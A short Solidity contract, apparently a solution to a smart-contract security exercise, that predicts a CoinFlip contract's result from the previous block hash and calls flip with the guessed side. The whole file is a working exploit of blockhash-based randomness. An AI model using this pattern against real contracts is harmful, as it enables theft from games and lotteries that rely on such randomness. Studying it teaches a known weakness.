// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipAttacker {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip s_target;

    constructor(address coinFlipperAddress) {
        s_target = CoinFlip(coinFlipperAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        s_target.flip(side);
    }
}
